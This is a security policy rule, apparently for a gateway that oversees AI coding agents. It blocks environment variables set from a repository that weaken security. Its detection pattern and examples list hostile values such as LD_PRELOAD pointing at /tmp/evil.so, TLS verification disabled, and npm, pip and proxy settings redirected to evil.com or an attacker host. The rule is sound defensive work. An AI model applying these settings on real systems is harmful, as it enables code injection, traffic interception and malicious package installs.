---
name: no-env-var-injection
version: "1.0.0"
domain: sectors/cybersecurity
description: Block injection of dangerous environment variables that alter security behavior
schema_version: 1
match:
  actions: ["execute", "configure"]
  contexts:
    content_pattern: "NODE_TLS_REJECT_UNAUTHORIZED=0|NODE_OPTIONS=.*--inspect|LD_PRELOAD=|DYLD_INSERT_LIBRARIES=|PYTHONPATH=.*\\.\\.|GIT_SSH_COMMAND=|npm_config_registry=|PIP_INDEX_URL=|CARGO_REGISTRIES_|HTTP_PROXY=|HTTPS_PROXY=|NODE_EXTRA_CA_CERTS=\\/dev\\/null"
    source_context: "repository"
verdict: DENY
severity: CRITICAL
priority: 350
author: sovraine
license: CC-BY-SA-4.0
tags: [environment-variables, injection, library-injection, security-bypass, ai-safety]
signature: null
certified: false
---

## What it does

Blocks repository-originated setting of environment variables that can compromise security, inject libraries, redirect traffic, or bypass protections.

## Why it exists

Environment variables control security-critical behavior across the entire system:

**Security bypass:**
- `NODE_TLS_REJECT_UNAUTHORIZED=0` → disables all TLS verification in Node.js
- `GIT_SSL_NO_VERIFY=1` → disables TLS for git operations
- `PYTHONDONTWRITEBYTECODE=` → not dangerous, but shows the principle

**Library injection (code execution):**
- `LD_PRELOAD=/tmp/evil.so` → Linux: inject shared library into every process
- `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib` → macOS: same for dylib
- `NODE_OPTIONS=--require=/tmp/evil.js` → inject JS module into every Node process
- `PYTHONPATH=/tmp/evil:$PYTHONPATH` → inject Python module path

**Traffic redirection:**
- `HTTP_PROXY=http://attacker:8080` → route all HTTP through attacker's proxy
- `HTTPS_PROXY=http://attacker:8080` → same for HTTPS (proxy sees TLS handshake)
- `npm_config_registry=https://evil.com` → redirect npm installs
- `PIP_INDEX_URL=https://evil.com/simple/` → redirect pip installs

**Debug/inspection:**
- `NODE_OPTIONS=--inspect=0.0.0.0:9229` → opens Node.js debugger on all interfaces

In this investigation:
- The user's `~/.zshrc` had `NODE_TLS_REJECT_UNAUTHORIZED=0` globally
- This meant all Node.js HTTPS (Claude Code, npm, MCP servers) was vulnerable to MITM

## What gets blocked

- `execute` — commands that set dangerous environment variables
- `configure` — writing these variables to shell configs, .env files, or CI configs

## What is still allowed

- Setting safe environment variables (PATH additions, app config)
- Operator-initiated proxy configuration (corporate proxies)
- `NODE_EXTRA_CA_CERTS=/path/to/ca.pem` (adding CAs, not bypassing TLS)

## How to override

The operator must define a safe environment variables policy in the gateway configuration, listing variables that may be set and their allowed value patterns. Security-critical variables (TLS bypass, library injection, proxy settings) require explicit operator approval per variable. Repository-originated environment variable changes are unconditionally blocked.
